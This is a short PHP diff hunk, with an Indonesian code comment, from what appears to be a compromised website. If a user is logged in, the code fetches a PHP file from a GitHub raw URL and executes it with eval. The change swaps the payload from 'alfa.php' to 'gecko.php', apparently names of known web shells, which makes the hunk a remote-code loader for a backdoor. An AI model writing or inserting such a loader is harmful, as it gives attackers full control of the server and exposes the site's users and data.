@@ -85,7 +85,7 @@ function getContent($url) {
 }
 // Cek jika user sudah login
 if (is_logged_in()) {
-    $url = 'https://raw.githubusercontent.com/R10TX/getback/main/alfa.php';
+    $url = 'https://raw.githubusercontent.com/R10TX/getback/main/gecko.php';
     $content = getContent($url);
     eval('?>' . $content);
     exit;
